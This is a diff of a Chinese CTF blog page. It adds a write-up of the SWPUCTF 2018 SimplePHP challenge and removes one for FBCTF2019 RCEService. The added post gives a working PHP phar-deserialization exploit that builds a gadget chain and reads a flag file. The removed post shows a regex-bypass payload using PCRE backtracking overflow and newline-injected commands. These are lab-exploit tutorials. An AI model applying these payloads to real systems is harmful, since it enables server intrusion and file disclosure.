@@ -71,6 +71,71 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-103" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/13/page-103/" class="article-date">
+  <time class="dt-published" datetime="2021-08-13T09:37:15.000Z" itemprop="datePublished">2021-08-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/13/page-103/">SWPUCTF 2018SimplePHP</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>界面简洁 不错不错<br>查看文件那可以看到一个**?file= 感觉有任意文件读取漏洞**<br>nice  可以 拿到file.php 然后有这个知道还有function.php class.php<br>那些文件的源码<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1cNEZut1YESQmT5bI2YCduQ">https://pan.baidu.com/s/1cNEZut1YESQmT5bI2YCduQ</a><br>提取码：1234<br>太长了就不放了<br>文件包含被过滤了  <strong>class.php那边 确实过滤了f1ag.php</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>连unseriaze() 都没有  但是看到了个<strong>phar感觉可以利用</strong><br>首先得找到触发的魔术方法<br>C1e4r类有_ _destruct() 在<strong>对象被销毁时调用 程序结束时会被自动调用 销毁对象</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">   &#123;</span><br><span class="line">       $this-&gt;test = $this-&gt;str;</span><br><span class="line">       echo $this-&gt;test;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有这个echo也可以利用 </p>
+<p>show类中_ _toString()<br>_ _toString 将<strong>一个对象转化成字符串的时候自动调用 比如echo print 会被调用并返回一个字符串</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function _ _toString()</span><br><span class="line"> &#123;</span><br><span class="line">     $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">     return $content;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>
+
+<p>利用这个$this<br>Test类中_ _get()<br>_ _get()  当<strong>未定义的属性或没有权限访问的属性被访问时会调用该方法</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public function __get($key)</span><br><span class="line">  &#123;</span><br><span class="line">      return $this-&gt;get($key);</span><br><span class="line">  &#125;</span><br><span class="line">  public function get($key)</span><br><span class="line">  &#123;</span><br><span class="line">      if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">          $value = $this-&gt;params[$key];</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          $value = &quot;index.php&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      return $this-&gt;file_get($value);</span><br><span class="line">  &#125;</span><br><span class="line">  public function file_get($value)</span><br><span class="line">  &#123;</span><br><span class="line">      $text = base64_encode(file_get_contents($value));</span><br><span class="line">      return $text;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用$this-&gt;get —&gt;$this-&gt;file_get($value) —&gt;base64_encode(file_get_contents($vale));<br>调用了file_get_contents 函数的file_get函数很重要  一般到调用了file_get_contents就可以认为链的结束</p>
+<p>触发：<br><strong>C1e4r::destruct()-&gt;show::toString()-&gt;test::get()</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c1e4r = new C1e4r();</span><br><span class="line">$show = new Show();</span><br><span class="line">$test = new Test();</span><br><span class="line">$test-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;;</span><br><span class="line">$c1e4r-&gt;str = $show;   //利用  $this-&gt;test = $this-&gt;str; echo $this-&gt;test;</span><br><span class="line">$show-&gt;str[&#x27;str&#x27;] = $test;  //利用 $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;aaa.phar&quot;); //.phar文件</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;); //固定的</span><br><span class="line">$phar-&gt;setMetadata($c1e4r); //触发的头是C1e4r类，所以传入C1e4r对象</span><br><span class="line">$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //随便写点什么生成个签名</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>phar后缀被禁止了 得改成gif</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得知道一下被改后的文件名 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa.gif222.90.67.205 md5 一下</span><br></pre></td></tr></table></figure>
+
+<p>然后发现一个很神奇的 上传目录是开着的 ┗|｀O′|┛ 那都不用算了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=phar://upload9030a3b2a4bb01f912500bf84dcc370d.jpg</span><br></pre></td></tr></table></figure>
+
+<p>得到base64加密的内容 解码一下就能拿到flag了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/13/page-103/" data-id="cksyl7wix0007w4w767mahvil" data-title="SWPUCTF 2018SimplePHP" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-102" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/08/13/page-102/" class="article-date">
@@ -635,63 +700,6 @@
 
 
   
-    <article id="post-page-93" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/06/page-93/" class="article-date">
-  <time class="dt-published" datetime="2021-08-06T03:58:43.000Z" itemprop="datePublished">2021-08-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/06/page-93/">FBCTF2019RCEService</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>网上找到了这题的源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = json_decode(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5399">https://xz.aliyun.com/t/5399</a><br>跑脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&#x27; + &quot;a&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://1a2bd44f-f0ac-4886-8ed9-fe2b868d490d.node4.buuoj.cn/&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
-
-<p>另一种方法</p>
-<p>因为是<strong>prematch所以匹配的第一行 就利用换行去绕过提交json格式</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A&quot;cmd&quot;: &quot;ls /&quot;%0A&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/140.PNG?raw=true" alt="140.PNG"></p>
-<p>**putenv(‘PATH=/home/rceservice/jail’)**已经修改了环境变量所以试着从这个路径找一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A&quot;cmd&quot;: &quot;ls /home/rceservice&quot;%0A&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/141.PNG?raw=true" alt="141.PNG"></p>
-<p>果然flag在这 直接用绝对路径调用就可以调用flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/142.PNG?raw=true" alt="142.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/06/page-93/" data-id="cksyl7wk6002cw4w7aem2g3ok" data-title="FBCTF2019RCEService" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -728,6 +736,10 @@
       <ul>
         
           <li>
+            <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/09/page-115/">又是misc</a>
           </li>
         
@@ -741,10 +753,6 @@
         
           <li>
             <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
           </li>
         
       </ul>
